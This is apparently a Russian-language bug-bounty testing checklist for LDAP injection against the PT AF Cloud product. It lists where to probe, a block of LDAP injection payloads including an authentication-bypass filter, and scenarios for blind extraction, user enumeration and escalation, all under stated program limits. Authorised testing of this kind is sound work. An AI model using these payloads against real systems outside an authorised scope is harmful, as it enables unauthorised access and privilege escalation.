# LDAP Injection — PT AF Cloud

## Что ищем
LDAP-инъекции в аутентификации, поиске пользователей, интеграциях с AD / LDAP.

## Где искать
- Логин через LDAP / AD (корпоративные интеграции PT Cloud AF)
- Поиск пользователей в консоли (`search=`, `user=`, `login=`)
- Фильтры по группам / ролям
- Синхронизация с AD (импорт пользователей)
- Интеграции SSO / SAML с LDAP-backend

## Payload'ы
```
*
*)(&
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*
*))%00
)(cn=*
```

## Сценарии
- **Обход аутентификации:** `*)(uid=*))(|(uid=*` → вход без пароля
- **Blind-извлечение:** атрибут за атрибутом (медленно, только PoC)
- **Enumeration пользователей:** `*)(uid=admin*` (осторожно — out-of-scope по правилам PT, если без эксплуатации)
- **Escalation:** вход под пользователем с более высокой ролью

## Ограничения PT
- Не брутить LDAP
- Не выгружать дерево AD
- PoC — только вход/чтение одного атрибута

## Инструменты
- ldapsearch (для понимания структуры, если есть тестовый LDAP)
- Burp + Intruder (точечно)
- JXplorer (визуализация)
